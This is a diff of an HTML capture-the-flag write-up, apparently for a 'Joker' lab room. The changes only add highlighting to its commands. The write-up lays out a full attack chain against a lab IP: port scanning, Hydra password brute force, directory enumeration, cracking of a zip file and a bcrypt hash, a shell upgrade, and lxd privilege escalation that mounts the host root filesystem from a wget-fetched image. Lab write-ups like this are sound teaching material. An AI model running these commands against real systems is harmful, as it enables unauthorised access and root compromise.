@@ -72,7 +72,7 @@
 <br>
 <p>Doing a simple nmap scan should tell us the infomation needed for the open ports.</p>
 <br>
-<p>nmap -v -sC -sV -oA nmap  10.10.173.35</p>
+<p><span class="highlight">nmap -v -sC -sV -oA nmap  10.10.173.35</span></p>
 <br>
 <img src="./joker/1.png">
 <br>
@@ -122,7 +122,7 @@
 <br>
 <p>Looks like for this task we are going to have to brute force the port, for this we will be using Hydra.</p>
 <br>
-<p>hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 10.10.173.35 http-get /</p>
+<p><span class="highlight">hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 10.10.173.35 http-get</span>/</p>
 <br>
 <img src="./joker/7.png">
 <br>
@@ -132,7 +132,7 @@
 <br>
 <p>For this task were gonna use gobuster again to search the directories on port 8080</p>
 <br>
-<p>gobuster -U joker -P hannah - dir -u http://10.10.173.35:8080/ -w /usr/share/wordlists/dirb/common.txt -t 20</p>
+<p><span class="highlight">gobuster -U joker -P hannah - dir -u http://10.10.173.35:8080/ -w /usr/share/wordlists/dirb/common.txt -t 20</span></p>
 <br>
 <img src="./joker/8.png">
 <br>
@@ -144,7 +144,7 @@
 <br>
 <p>For this we asked to find the ‘backup’ file, after enumerating for a while I eventually fell back to nikto which gives a bit more of a in-depth scan compared to gobuster</p>
 <br>
-<p>nikto -h http://10.10.173.35:8080/ -id joker:hannah</p>
+<p><span class="highlight">nikto -h http://10.10.173.35:8080/ -id joker:hannah</span></p>
 <br>
 <img src="./joker/10.png">
 <br>
@@ -154,7 +154,7 @@
 <br>
 <p>When we visit /backup.zip we can download a zip file but it seems to be password protected, lets crack it!</p>
 <br>
-<p>zip2john backup.zip > joker.hash</p>
+<p><span class="highlight">zip2john backup.zip > joker.hash</span></p>
 <br>
 <p>sudo john joker.hash</p>
 <br>
@@ -176,9 +176,9 @@
 <br>
 <p>Looks like we got a password hash for admin from that db file, lets crack it!</p>
 <br>
-<p>echo '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG' > pass.txt</p>
+<p><span class="highlight">echo '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG' > pass.txt</span></p>
 <br>
-<p>sudo john pass.txt --show</p>
+<p><span class="highlight">sudo john pass.txt --show</span></p>
 <br>
 <img src="./joker/14.png">
 <br>
@@ -236,7 +236,7 @@
 <br>
 <p>Looks like we need to create a tty shell...</p>
 <br>
-<p>python3 -c 'import pty; pty.spawn("/bin/bash");'</p>
+<p><span class="highlight">python3 -c 'import pty; pty.spawn("/bin/bash");'</span></p>
 <br>
 <img src="./joker/25.png">
 <br>
@@ -265,11 +265,11 @@
 <br>
 <img src="./joker/26.png">
 <br>
-<p>git clone  https://github.com/saghul/lxd-alpine-builder.git</p>
+<p><span class="highlight">git clone  https://github.com/saghul/lxd-alpine-builder.git</span></p>
 <br>
-<p>cd lxd-alpine-builder</p>
+<p><span class="highlight">cd lxd-alpine-builder</span></p>
 <br>
-<p>./build-alpine</p>
+<p><span class="highlight">./build-alpine</span></p>
 <br>
 <img src="./joker/27.png">
 <br>
@@ -277,29 +277,29 @@
 <br>
 <p>Ok cool looks like we got all the files we need downloaded, now its time to upload them.</p>
 <br>
-<p>sudo python3 -m http.server 80</p>
+<p><span class="highlight">sudo python3 -m http.server 80</span></p>
 <br>
 <img src="./joker/29.png">
 <br>
 <p>Ok now to download it from the shell we got</p>
 <br>
-<p>cd /tmp</p>
+<p><span class="highlight">cd /tmp</span></p>
 <br>
-<p>wget http://10.45.54.205:80/alpine-v3.12-x86_64-20200923_0009.tar.gz</p>
+<p><span class="highlight">wget http://10.45.54.205:80/alpine-v3.12-x86_64-20200923_0009.tar.gz</span></p>
 <br>
 <img src="./joker/30.png">
 <br>
-<p>lxc image import ./alpine-v3.12-x86_64-20200923_0009.tar.gz --alias myimage</p>
+<p><span class="highlight">lxc image import ./alpine-v3.12-x86_64-20200923_0009.tar.gz --alias myimage</span></p>
 <br>
 <img src="./joker/31.png">
 <br>
-<p>lxc init myimage ignite -c security.privileged=true</p>
+<p><span class="highlight">lxc init myimage ignite -c security.privileged=true</span></p>
 <br>
-<p>lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true</p>
+<p><span class="highlight">lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true</span></p>
 <br>
-<p>lxc start ignite</p>
+<p><span class="highlight">lxc start ignite</span></p>
 <br>
-<p>lxc exec ignite /bin/sh</p>
+<p><span class="highlight">lxc exec ignite /bin/sh</span></p>
 <br>
 <img src="./joker/32.png">
 <br>
